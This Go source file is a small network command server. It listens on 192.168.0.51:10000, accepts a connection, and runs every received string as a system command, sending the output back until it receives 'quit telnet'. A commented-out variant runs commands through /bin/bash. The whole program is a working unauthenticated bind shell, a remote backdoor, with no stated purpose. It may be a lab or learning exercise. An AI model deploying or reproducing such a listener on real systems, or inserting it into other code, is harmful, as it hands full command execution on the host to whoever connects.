package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func CommandExec(cmdString string) string {
	str := strings.Split(cmdString, " ")
	name := str[0]
	arg := str[1:]
	cmd := exec.Command(name, arg...)
	// cmd.Stderr = os.Stderr
	// cmd.Stdout = os.Stdout
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return string(err.Error())
	}
	return string(out)
	// cmd := exec.Command("/bin/bash", "-c", cmdString)

	// stdout, _ := cmd.StdoutPipe()
	// if err := cmd.Start(); err != nil {
	// 	fmt.Println("Execute failed when Start:" + err.Error())
	// 	return ""
	// }

	// out_bytes, _ := ioutil.ReadAll(stdout)
	// stdout.Close()

	// if err := cmd.Wait(); err != nil {
	// 	fmt.Println("Execute failed when Wait:" + err.Error())
	// 	return ""
	// }
	// return string(out_bytes)
}

func ConnectProxy() net.Conn {
	listener, err := net.Listen("tcp", "192.168.0.51:10000")
	if err != nil {
		fmt.Println("error is(ConnectProxy): ", err)
	}
	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("error is(ConnectProxy): ", err)
	}

	fmt.Println("connected!")
	return conn
}

func ReceiveCommandProxy(proxyConn net.Conn) string {
	result := make([]byte, 4096)
	n, err := proxyConn.Read(result)
	if err != nil {
		fmt.Println("error is(ReceiveCommandProxy): ", err)
	}
	return string(result[:n])
}

func main() {
	fmt.Println("waiting connection...")
	proxyConn := ConnectProxy()
	fmt.Println("connected...")
	for {
		command := ReceiveCommandProxy(proxyConn)
		fmt.Println(command)
		if command == "quit telnet" {
			proxyConn.Close()
			break
		}
		out := CommandExec(command)
		proxyConn.Write([]byte(out))
	}
	fmt.Println("end")
}
